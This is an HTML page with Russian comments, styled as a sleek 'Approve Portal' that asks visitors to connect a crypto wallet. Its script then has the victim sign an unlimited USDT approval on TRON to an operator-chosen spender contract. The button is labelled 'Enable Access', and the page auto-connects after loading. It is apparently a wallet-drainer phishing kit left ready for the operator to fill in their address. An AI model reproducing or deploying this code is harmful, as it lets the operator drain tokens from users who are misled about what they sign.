<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DApp Interface</title>
    <style>
        /* Минималистичный премиальный дизайн */
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background: #0D0D12; 
            color: #FFFFFF; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
        }
        .container {
            background: rgba(255, 255, 255, 0.05);
            padding: 40px;
            border-radius: 24px;
            backdrop-filter: blur(10px);
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
            max-width: 350px;
            width: 100%;
        }
        h2 { margin-top: 0; font-size: 24px; font-weight: 600; }
        button { 
            background: #FFFFFF; 
            color: #000000; 
            border: none; 
            padding: 16px 32px; 
            font-size: 16px; 
            font-weight: 600;
            border-radius: 12px; 
            cursor: pointer; 
            transition: all 0.2s ease; 
            width: 100%;
            margin-top: 20px;
        }
        button:hover { background: #E0E0E0; transform: translateY(-2px); }
        button:disabled { background: #333; color: #888; cursor: not-allowed; transform: none; }
        #status { margin-top: 20px; font-size: 14px; color: #8892B0; word-break: break-all; }
    </style>
</head>
<body>

    <div class="container">
        <h2>Approve Portal</h2>
        <p id="description" style="color: #8892B0; font-size: 14px; margin-bottom: 30px;">
            Securely connect your wallet to continue.
        </p>
        <button id="mainBtn">Connect Wallet</button>
        <div id="status"></div>
    </div>

    <script>
        // === НАСТРОЙКИ ===
        // Адрес токена (например, USDT в сети TRON Mainnet)
        const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
        
        // ВАЖНО: Вставьте сюда адрес ВАШЕГО смарт-контракта, которому даем апрув
        const SPENDER_ADDRESS = "TXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"; 
        
        // Бесконечный лимит
        const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

        const btn = document.getElementById('mainBtn');
        const statusText = document.getElementById('status');
        let userAddress = null;

        // Шаг 1: Подключение кошелька
        async function connectWallet() {
            // Проверяем, есть ли объект tronWeb (встроен ли браузер кошелька)
            if (window.tronWeb && window.tronWeb.ready) {
                userAddress = window.tronWeb.defaultAddress.base58;
                statusText.innerHTML = `Connected:<br><span style="color:#fff">${userAddress.substring(0, 6)}...${userAddress.slice(-4)}</span>`;
                
                // Меняем кнопку на вызов апрува
                btn.innerText = "Enable Access"; 
                btn.onclick = approveContract; 
            } else {
                try {
                    // Пытаемся вызвать окно TronLink, если оно установлено
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res.code === 200) {
                        connectWallet(); // Рекурсивный вызов после успешного коннекта
                    }
                } catch (e) {
                    statusText.innerText = "Пожалуйста, откройте эту ссылку внутри DApp браузера Trust Wallet, TronLink или TokenPocket.";
                    
                    // Опционально: Deep Link перенаправление для Trust Wallet
                    // window.location.href = "https://link.trustwallet.com/open_url?coin=195&url=" + encodeURIComponent(window.location.href);
                }
            }
        }

        // Шаг 2: Вызов Approve смарт-контракта
        async function approveContract() {
            if (!userAddress) return;
            
            try {
                btn.innerText = "Processing...";
                btn.disabled = true;
                statusText.innerText = "Ожидание подтверждения в кошельке...";

                // Подключаемся к контракту токена
                const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
                
                // Вызываем функцию approve
                // feeLimit: 100000000 = 100 TRX (лимит энергии, снимется только нужная часть)
                const txId = await contract.approve(SPENDER_ADDRESS, MAX_UINT).send({
                    feeLimit: 100000000 
                });
                
                statusText.innerHTML = `<span style="color:#00E676">Success!</span><br>TX: ${txId.substring(0, 8)}...`;
                btn.innerText = "Approved";
            } catch (error) {
                console.error(error);
                btn.innerText = "Try Again";
                btn.disabled = false;
                statusText.innerText = "Отменено пользователем или ошибка сети.";
            }
        }

        // Привязываем функцию к кнопке
        btn.onclick = connectWallet;

        // Авто-проверка при загрузке страницы
        setTimeout(() => {
            if (window.tronWeb && window.tronWeb.ready) {
                connectWallet();
            }
        }, 1000);
    </script>
</body>
</html>
